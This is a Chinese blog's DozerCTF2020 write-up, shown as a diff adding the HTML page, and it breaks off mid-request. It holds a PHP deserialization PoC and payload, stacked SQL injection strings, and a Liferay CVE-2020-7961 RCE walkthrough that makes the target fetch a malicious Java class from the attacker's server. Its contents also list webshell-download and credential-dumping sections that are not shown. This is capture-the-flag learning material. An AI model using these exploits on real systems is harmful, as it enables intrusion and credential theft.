@@ -1,0 +1,1312 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>DozerCTF2020 Writeup - Leon&#39;s Blog</title><meta name="Description" content="Leon&#39;s Blog-Keep learning web security"><meta property="og:title" content="DozerCTF2020 Writeup" />
+<meta property="og:description" content="这个比赛赛题质量都很高，且偏向实战多一点，上来就是域渗透属实令人肾透，xxe打ssrf最后差一点做出来比较可惜" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://clq0.top/dozerctf2020-writeup/" />
+<meta property="og:image" content="https://clq0.top/logo_.jpg"/>
+<meta property="article:published_time" content="2020-06-15T20:24:46+08:00" />
+<meta property="article:modified_time" content="2020-06-15T20:24:46+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://clq0.top/logo_.jpg"/>
+
+<meta name="twitter:title" content="DozerCTF2020 Writeup"/>
+<meta name="twitter:description" content="这个比赛赛题质量都很高，且偏向实战多一点，上来就是域渗透属实令人肾透，xxe打ssrf最后差一点做出来比较可惜"/>
+<meta name="application-name" content="Leon&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://clq0.top/dozerctf2020-writeup/" /><link rel="prev" href="https://clq0.top/php-create_function/" /><link rel="next" href="https://clq0.top/%E4%B8%AD%E8%AE%A1%E9%87%8F%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%A4%A7%E5%AD%A6%E7%94%9Fctf%E7%AB%9E%E8%B5%9B-writeup/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "DozerCTF2020 Writeup",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/clq0.top\/dozerctf2020-writeup\/"
+        },"genre": "posts","keywords": "域渗透, SSRF, XXE, RCE, SQL注入","wordcount":  5778 ,
+        "url": "https:\/\/clq0.top\/dozerctf2020-writeup\/","datePublished": "2020-06-15T20:24:46+08:00","dateModified": "2020-06-15T20:24:46+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Leon","logo": "https:\/\/clq0.top\/logo_.jpg"},"author": {
+                "@type": "Person",
+                "name": "Leon"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Leon&#39;s Blog"><span class="header-title-pre">❤</span>Leon&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Leon&#39;s Blog"><span class="header-title-pre">❤</span>Leon&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">DozerCTF2020 Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="http://clq0.top" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>Leon</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw"></i>Writeup</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-06-15">2020-06-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;5778 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;12 minutes&nbsp;<span id="/dozerctf2020-writeup/" class="leancloud_visitors" data-flag-title="DozerCTF2020 Writeup">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+                    </span>&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#利用cve-2020-7961命令执行">利用CVE-2020-7961命令执行</a>
+      <ul>
+        <li><a href="#漏洞说明">漏洞说明</a></li>
+        <li><a href="#影响范围">影响范围</a></li>
+        <li><a href="#环境搭建">环境搭建</a></li>
+        <li><a href="#漏洞复现">漏洞复现</a></li>
+      </ul>
+    </li>
+    <li><a href="#利用certutil进行远程下载webshell">利用certutil进行远程下载webshell</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#先进行简单信息收集列出域信任关系">先进行简单信息收集，列出域信任关系：</a></li>
+    <li><a href="#获取本机hash">获取本机hash</a></li>
+    <li><a href="#转储内存抓域凭证">转储内存抓域凭证:</a></li>
+    <li><a href="#使用dsquery导出域信息">使用dsquery导出域信息</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#简单复现">简单复现</a>
+      <ul>
+        <li><a href="#获取viewstateuserkey">获取viewstateuserkey</a></li>
+        <li><a href="#获取generator值">获取generator值</a></li>
+        <li><a href="#获得shell">获得shell</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>这个比赛赛题质量都很高，且偏向实战多一点，上来就是域渗透属实令人肾透，xxe打ssrf最后差一点做出来比较可惜</p>
+<h1 id="真签到">真·签到</h1>
+<p>下载下来是一个exe，打不开，拖进winhex发现：
+<code>R00yVE1NWlRIRTJFRU5CWUdVM1RNUlJURzRaVEtOUllHNFpUTU9CV0lJM0RRTlJXRzQ0VE9OSlhHWTJET05aUkc1QVRPTUJUR0kyRUVNWlZHNDNUS05aWEc0MlRHTkpaR1pBVElNUldHNDNUT05KVUc0M0RPTUJXR0kyRUtOU0ZHTTRUT09CVUc0M0VFPT09Cgo=</code>
+base64解码后：
+<code>GM2TMMZTHE2EENBYGU3TMRRTG4ZTKNRYG4ZTMOBWII3DQNRWG44TONJXGY2DONZRG5ATOMBTGI2EEMZVG43TKNZXG42TGNJZGZATIMRWG43TONJUG43DOMBWGI2EKNSFGM4TOOBUG43EE===</code>
+只有大写字母和数字应该是base32，解码后：
+<code>3563394B48576F37356873686B686679757647717A70324B3577577753596A426777547670624E6E3978476B</code>
+一般base32完是十六进制：
+<code>5c9KHWo75hshkhfyuvGqzp2K5wWwSYjBgwTvpbNn9xGk</code>
+由于Base58采用的字符集合为“123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ”，从这不难看出，Base58是纯数字与字母组成而且去掉了容易引起视觉混淆的字符（0：数字零，O：大写O，I：大写i，l:小写L）。9个数字+49个字母=58个。
+所以猜测是base58：
+<code>Dozerctf{base_family_is_so_good}</code></p>
+<h1 id="白给的反序列化">白给的反序列化</h1>
+<p>入门反序列化题
+源码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+
+<span class="k">class</span> <span class="nc">home</span>
+<span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$method</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$args</span><span class="p">;</span>
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">method</span> <span class="o">=</span> <span class="nv">$method</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">args</span> <span class="o">=</span> <span class="nv">$args</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">method</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;mysys&#34;</span><span class="p">)))</span> <span class="p">{</span>
+            <span class="nx">call_user_func_array</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">method</span><span class="p">),</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">args</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">mysys</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nx">print_r</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;cat </span><span class="si">$path</span><span class="s2">&#34;</span><span class="p">)));</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;No&#34;</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nv">$str</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$num</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">args</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">args</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">waf</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="nv">$v</span><span class="p">));</span>
+            <span class="nv">$num</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$num</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">die</span><span class="p">(</span><span class="s2">&#34;No&#34;</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">])</span> <span class="p">{</span>
+    <span class="nv">$path</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">];</span>
+    <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>poc：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="c1">//poc
+</span><span class="c1"></span><span class="k">class</span> <span class="nc">home</span>
+<span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$method</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$args</span><span class="p">;</span>
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">method</span> <span class="o">=</span> <span class="nv">$method</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">args</span> <span class="o">=</span> <span class="nv">$args</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">method</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;mysys&#34;</span><span class="p">)))</span> <span class="p">{</span>
+            <span class="nx">call_user_func_array</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">method</span><span class="p">),</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">args</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">mysys</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nx">print_r</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;cat </span><span class="si">$path</span><span class="s2">&#34;</span><span class="p">)));</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;No&#34;</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nv">$str</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$num</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">args</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">args</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">waf</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="nv">$v</span><span class="p">));</span>
+            <span class="nv">$num</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$num</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">die</span><span class="p">(</span><span class="s2">&#34;No&#34;</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$poc</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">home</span><span class="p">(</span><span class="s2">&#34;mysys&#34;</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">));</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$poc</span><span class="p">));</span>
+<span class="nx">print_r</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+<span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+<span class="cp">?&gt;</span> 
+</code></pre></td></tr></table>
+</div>
+</div><p>payload:</p>
+<p><code>?path=O%3A4%3A%22home%22%3A2%3A%7Bs%3A12%3A%22%00home%00method%22%3Bs%3A5%3A%22mysys%22%3Bs%3A10%3A%22%00home%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22flag.php%22%3B%7D%7D</code></p>
+<p>得到：<code>PD9waHAgJGZsYWcgPSAnZmxhZ3tqNG5jOTIwZm04YjJ6MHIybWM3ZHNmODdzNjc4NWE2NzVzYTc3NnZkfSc7Pz4=</code></p>
+<p>base64：<code>&lt;?php $flag = 'flag{j4nc920fm8b2z0r2mc7dsf87s6785a675sa776vd}';?&gt;</code></p>
+<h1 id="sqli-labs-0">sqli-labs 0</h1>
+<p>根据hint将接下来sql注入的语句全部用url二次编码就行
+id=1&rsquo; # 单引号注入，select被过滤，根据经验直接堆叠
+<code>1';show databases;#</code>
+<code>1';show tables;#</code>
+<code>1';show columns from </code>uziuzi<code>;#</code>
+<code>1';handler uziuzi open;handler uziuzi read first;#</code>
+回显得到flag<code>flag{594cb6af684ad354b4a59ac496473990}</code></p>
+<h1 id="简单域渗透-flag1">简单域渗透-flag1</h1>
+<h2 id="利用cve-2020-7961命令执行">利用CVE-2020-7961命令执行</h2>
+<blockquote>
+<p>参考：<a href="https://paper.seebug.org/1162/" title="Liferay Portal Json Web Service 反序列化漏洞(CVE-2020-7961)" target="_blank" rel="noopener noreffer">Liferay Portal Json Web Service 反序列化漏洞(CVE-2020-7961)</a>
+<a href="https://xz.aliyun.com/t/7499" title="CVE-2020-7961 Liferay Portal 反序列化RCE分析" target="_blank" rel="noopener noreffer">CVE-2020-7961 Liferay Portal 反序列化RCE分析</a></p>
+</blockquote>
+<h3 id="漏洞说明">漏洞说明</h3>
+<p>这题入门漏洞很容易找到，而且网上复现的文章挺多
+该洞是个反序列化导致的rce，通过未授权访问其api传递json数据进行反序列化达到加载外部恶意class进而命令执行</p>
+<h3 id="影响范围">影响范围</h3>
+<p>Liferay Portal 6.1.X
+Liferay Portal 6.2.X
+Liferay Portal 7.0.X
+Liferay Portal 7.1.X
+Liferay Portal 7.2.X</p>
+<h3 id="环境搭建">环境搭建</h3>
+<p>下载带tomcat的集成版，进入到<code>liferay-ce-portal-7.2.0-ga1\tomcat-9.0.17\bin</code>目录，执行：<code>.\catalina.bat run</code>等待一会就启动了，访问8080端口即可
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615095239.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615095239.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615095239.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615095239.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200615095239.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200615095239.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615066303.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615066303.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615066303.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615066303.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200615066303.png"
+        title="QQ图片20200615066303" /></p>
+<h3 id="漏洞复现">漏洞复现</h3>
+<p>LifExp.java文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">LifExp</span> <span class="o">{</span> 
+    <span class="kd">static</span> <span class="o">{</span> 
+        <span class="k">try</span> <span class="o">{</span> 
+            <span class="n">String</span><span class="o">[]</span> <span class="n">cmd</span> <span class="o">=</span> <span class="o">{</span><span class="s">&#34;cmd.exe&#34;</span><span class="o">,</span> <span class="s">&#34;/c&#34;</span><span class="o">,</span> <span class="s">&#34;calc.exe&#34;</span><span class="o">};</span>
+            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span>
+<span class="n">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">).</span><span class="na">waitFor</span><span class="o">();</span> 
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span> <span class="n">Exception</span> <span class="n">e</span> <span class="o">)</span> <span class="o">{</span> 
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span> 
+        <span class="o">}</span> 
+    <span class="o">}</span> 
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>将LifExp.java放在vps上，因为需要靶机能访问到，使用<code>javac LifExp.java</code>生成<code>LifExp.class</code></li>
+<li>要构造payload还需要一个包：<a href="https://leonsec.lanzous.com/imzwNdome8b" title="marshalsec-0.0.3-SNAPSHOT-all.jar" target="_blank" rel="noopener noreffer">marshalsec-0.0.3-SNAPSHOT-all.jar</a>
+我放到蓝奏云上了，有需要自行下载</li>
+<li>使用<code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Jackson C3P0WrapperConnPool http://ip:port/ LifExp</code>生成序列化内容（这里的ip是你提供恶意class的vps）
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615101659.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615101659.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615101659.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200615101659.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200615101659.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200615101659.png" /></li>
+<li>在vps上使用<code>python3 -m http.server 8500</code>在当前目录启动端口8500的web服务</li>
+<li>用bp发包：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">POST /api/jsonws/invoke HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Length: 1349
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
